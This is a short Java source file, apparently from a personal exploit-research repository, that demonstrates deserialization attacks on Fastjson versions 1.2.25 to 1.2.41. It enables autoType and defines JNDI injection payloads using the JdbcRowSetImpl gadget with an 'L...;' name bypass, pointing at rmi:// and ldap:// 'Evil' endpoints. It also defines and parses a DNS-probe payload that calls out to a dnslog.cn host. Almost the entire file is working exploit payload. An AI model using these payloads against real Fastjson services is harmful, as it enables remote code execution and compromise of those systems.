package com.t4rrega.Chain;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJson1_2_25to41 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        // JdbcRowSetImpl
        String payloadRmi = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Evil\", \"autoCommit\":true}";
        String payloadLdap = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Evil\", \"autoCommit\":true}";

        String payloaddetack = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"ynninb.dnslog.cn\n\"}";

        JSON.parse(payloaddetack);
    }
}
